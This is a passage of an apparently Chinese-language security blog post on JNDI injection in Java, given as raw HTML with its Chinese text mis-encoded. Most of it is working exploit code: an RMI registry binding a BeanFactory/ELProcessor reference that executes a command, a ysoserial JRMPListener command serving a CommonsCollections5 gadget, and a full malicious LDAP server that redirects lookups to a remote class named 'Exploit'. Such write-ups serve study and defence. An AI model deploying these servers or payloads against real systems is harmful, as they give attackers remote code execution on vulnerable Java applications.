</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Properties</span><span class="w"> </span><span class="n">env</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Properties</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">env</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">env</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">Context</span><span class="p">.</span><span class="na">PROVIDER_URL</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;rmi://127.0.0.1:1099&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InitialContext</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">(</span><span class="n">env</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ResourceRef</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ResourceRef</span><span class="p">(</span><span class="s">&#34;javax.el.ELProcessor&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;org.apache.naming.factory.BeanFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ref</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringRefAddr</span><span class="p">(</span><span class="s">&#34;forceString&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xx=eval&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ref</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringRefAddr</span><span class="p">(</span><span class="s">&#34;xx&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;\&#34;\&#34;.getClass().forName(\&#34;javax.script.ScriptEngineManager\&#34;).newInstance().getEngineByName(\&#34;JavaScript\&#34;).eval(\&#34;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;calc&#39;]).start()\&#34;)&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReferenceWrapper</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ReferenceWrapper</span><span class="p">(</span><span class="n">ref</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctx</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;Jie&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>æˆåŠŸæ‰§è¡Œ</p>
<p><img loading="lazy" src="images/image-20250122114045977.png" alt="image-20250122114045977"  />
</p>
<h5 id="beanfactoryåˆ©ç”¨">BeanFactoryåˆ©ç”¨<a hidden class="anchor" aria-hidden="true" href="#beanfactoryåˆ©ç”¨">#</a></h5>
<p>ä¼šå»è·å–<code>forceString</code>çš„å€¼ï¼Œå…ˆä¼šé€šè¿‡<code>,</code>åˆ†å‰²æˆå¤šå¯¹methodï¼Œç„¶åé€šè¿‡<code>=</code>åˆ†å‰²æ¯å¯¹å€¼ï¼Œå‰é¢çš„ä¸ºæœ€åæ”¾å…¥<code>mapçš„key</code>ï¼Œåé¢ä¸ºè¦è·å–çš„<code>methodåå­—</code>ï¼Œç„¶åä»beanclassè·å–è¿™ä¸ªæ–¹æ³•ï¼ˆæ³¨æ„è¿™é‡Œåªä¼šè·å–Stringä¸ºå‚æ•°çš„æ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹åˆ°<code>paramTypes</code>æ˜¯ä¸å¯æ§çš„ï¼‰ï¼Œç„¶åputåˆ°<code>forced</code>è¿™ä¸ªHashmapä¸­</p>
<p><code>beanClass</code>æ˜¯é€šè¿‡<code>beanClassName</code>å’ŒAppåŠ è½½å™¨å¾—åˆ°çš„class</p>
<p><img loading="lazy" src="images/image-20250207153622697.png" alt="image-20250207153622697"  />
</p>
<p>ç„¶ååˆ°ä¸‹é¢è¿™ä¸ªwhileä¸­ï¼Œè¿™é‡Œè·å–<code>Type</code>ï¼Œå½“ä¸ä¸ºifä¸­çš„å€¼æ—¶ï¼Œä¼šä»å‰é¢è®¾ç½®çš„forcedä¸­é€šè¿‡è¿™ä¸ª<code>Typeåå­—</code>è·å–å¯¹åº”çš„methodï¼Œç„¶åé€šè¿‡åå°„è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¿™ä¸¤ä¸ªåœ°æ–¹å€¼ï¼ˆxxï¼‰è¦å¯¹åº”</p>
<p><img loading="lazy" src="images/image-20250207154920779.png" alt="image-20250207154920779"  />
</p>
<p>beanå¯¹è±¡å°±æ˜¯beanClasså®ä¾‹åŒ–ï¼Œç„¶åè¿™ä¸ªåœ°æ–¹æ‰§è¡ŒæˆåŠŸ<code>javax.el.ELProcessor#eval</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Object</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">beanClass</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><h6 id="åˆ©ç”¨å°ç»“">åˆ©ç”¨å°ç»“<a hidden class="anchor" aria-hidden="true" href="#åˆ©ç”¨å°ç»“">#</a></h6>
<p><code>BeanFactory#getObjectInstance</code>åˆ©ç”¨æ¡ä»¶</p>
<ul>
<li>JDKæˆ–è€…å¸¸ç”¨åº“çš„ç±»</li>
<li>æœ‰publicä¿®é¥°çš„æ— å‚æ„é€ æ–¹æ³•  //æ˜¾è€Œæ˜“è§ï¼Œç›´æ¥é€šè¿‡newInstance()è·å¾—å¯¹è±¡çš„</li>
<li>publicä¿®é¥°çš„åªæœ‰ä¸€ä¸ªString.classç±»å‹å‚æ•°çš„æ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•å¯ä»¥é€ æˆæ¼æ´  //åªèƒ½è°ƒç”¨Stringæ–¹æ³•</li>
</ul>
<p>ä¸Šé¢å°±åˆ©ç”¨çš„elè¡¨è¾¾å¼</p>
<h4 id="try2-ååºåˆ—åŒ–">try2 ååºåˆ—åŒ–<a hidden class="anchor" aria-hidden="true" href="#try2-ååºåˆ—åŒ–">#</a></h4>
<p><strong>åˆ©ç”¨registerè¿”å›æ¶æ„åºåˆ—åŒ–æ•°æ® ååºåˆ—åŒ– æ‰§è¡Œgadget</strong></p>
<p>å…¶å®åˆ†æè¿‡<code>RMIååºåˆ—åŒ–</code>ä¸éš¾æƒ³åˆ°ã€‚<code>lookup</code>ä¸­<code>client</code>ä¼šå’Œ<code>register</code>è¿›è¡Œæ•°æ®ä¼ è¾“ä¸”å­˜åœ¨<code>ååºåˆ—åŒ–</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">MyFiles</span><span class="err">\</span><span class="n">Tools</span><span class="err">\</span><span class="n">ENV</span><span class="err">\</span><span class="n">JAVA</span><span class="err">\</span><span class="n">jdk1</span><span class="p">.</span><span class="na">8</span><span class="p">.</span><span class="na">0_192</span><span class="err">\</span><span class="n">bin</span><span class="err">\</span><span class="n">java</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">cp</span><span class="w"> </span><span class="n">ysoserial</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="n">ysoserial</span><span class="p">.</span><span class="na">exploit</span><span class="p">.</span><span class="na">JRMPListener</span><span class="w"> </span><span class="n">1099</span><span class="w"> </span><span class="n">CommonsCollections5</span><span class="w"> </span><span class="s">&#34;calc&#34;</span><span class="w">
</span></span></span></code></pre></div><p><strong>ç„¶åè¿è¡Œclient</strong></p>
<p>ç›´æ¥åˆ°<code>æœ€åé‚£ä¸ªlookup</code>ä¸­ï¼Œè¿™é‡Œä¼šå‘registerä¼ åºåˆ—åŒ–æ•°æ®åšå‡†å¤‡ï¼Œç„¶åè·Ÿè¿›è¿™ä¸ª<code>invoke</code></p>
<p><img loading="lazy" src="images/image-20250122175241595.png" alt="image-20250122175241595"  />
</p>
<p>åˆ°<code>executeCall()</code>,è¿™é‡Œ<code>this.getInputStream();</code>ä¼šæ¥æ”¶<code>register</code>ä¼ å›çš„åºåˆ—åŒ–æ•°æ®ï¼ˆè¿™é‡Œæˆ‘ä»¬æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®å³å¯åˆ©ç”¨ï¼‰ï¼Œç„¶åä¸‹æ–¹è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<p><img loading="lazy" src="images/image-20250122175424050.png" alt="image-20250122175424050"  />
</p>
<p>ä¹Ÿå°±æ˜¯è¯´<code>rmiåè®®</code>åœ¨é«˜ç‰ˆæœ¬ä¸‹ï¼Œå¯ä»¥æ‰“<code>gadget</code></p>
<h1 id="0x03-ldap">0x03 LDAP<a hidden class="anchor" aria-hidden="true" href="#0x03-ldap">#</a></h1>
<p>åœ¨<code>jdk8u191</code>ä¹‹å‰éƒ½èƒ½ç”¨ldapåŠ è½½è¿œç¨‹æ¶æ„ç±»</p>
<p><code>ldapæœåŠ¡ç«¯</code>éœ€è¦ä»¥ä¸‹ä¾èµ–</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.unboundid<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>unboundid-ldapsdk<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>6.0.7<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>LDAPServer.java</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">ldap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.Entry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.LDAPException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.LDAPResult</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.ResultCode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.ServerSocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.SocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.ssl.SSLSocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.InetAddress</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.MalformedURLException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.text.ParseException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LDAPServer</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">LDAP_BASE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;dc=ldap&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;http://127.0.0.1:4444/#evilexp&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">1389</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InMemoryDirectoryServerConfig</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryDirectoryServerConfig</span><span class="p">(</span><span class="n">LDAP_BASE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">config</span><span class="p">.</span><span class="na">setListenerConfigs</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryListenerConfig</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;listen&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">InetAddress</span><span class="p">.</span><span class="na">getByName</span><span class="p">(</span><span class="s">&#34;0.0.0.0&#34;</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">port</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ServerSocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">SocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">(</span><span class="n">SSLSocketFactory</span><span class="p">)</span><span class="w"> </span><span class="n">SSLSocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">()));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">config</span><span class="p">.</span><span class="na">addInMemoryOperationInterceptor</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">OperationInterceptor</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="n">url</span><span class="p">)));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InMemoryDirectoryServer</span><span class="w"> </span><span class="n">ds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryDirectoryServer</span><span class="p">(</span><span class="n">config</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Listening on 0.0.0.0:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">port</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ds</span><span class="p">.</span><span class="na">startListening</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">class</span> <span class="nc">OperationInterceptor</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">InMemoryOperationInterceptor</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">private</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">codebase</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="nf">OperationInterceptor</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">cb</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cb</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">         * {@inheritDoc}
</span></span></span><span class="line"><span class="cl"><span class="cm">         *
</span></span></span><span class="line"><span class="cl"><span class="cm">         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">processSearchResult</span><span class="w"> </span><span class="p">(</span><span class="n">InMemoryInterceptedSearchResult</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">result</span><span class="p">.</span><span class="na">getRequest</span><span class="p">().</span><span class="na">getBaseDN</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Entry</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Entry</span><span class="p">(</span><span class="n">base</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sendResult</span><span class="p">(</span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">base</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">e1</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">e1</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sendResult</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">InMemoryInterceptedSearchResult</span><span class="w"> </span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">base</span><span class="p">,</span><span class="w"> </span><span class="n">Entry</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">LDAPException</span><span class="p">,</span><span class="w"> </span><span class="n">MalformedURLException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">URL</span><span class="w"> </span><span class="n">turl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">.</span><span class="na">getRef</span><span class="p">().</span><span class="na">replace</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">).</span><span class="na">concat</span><span class="p">(</span><span class="s">&#34;.class&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Send LDAP reference result for &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; redirecting to &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">turl</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaClassName&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Exploit&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cbstring</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">refPos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbstring</span><span class="p">.</span><span class="na">indexOf</span><span class="p">(</span><span class="sc">&#39;#&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">refPos</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">cbstring</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cbstring</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">refPos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//             Payload1: åˆ©ç”¨ LDAP + Reference Factory</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaCodeBase&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cbstring</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;objectClass&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;javaNamingReference&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;javaFactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="p">.</span><span class="na">getRef</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//             Payload2: è¿”å›åºåˆ—åŒ– Gadget</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            try {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                e.addAttribute(&#34;javaSerializedData&#34;, Base64.decode(&#34;...&#34;));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            } catch (ParseException exception) {</span><span class="w">
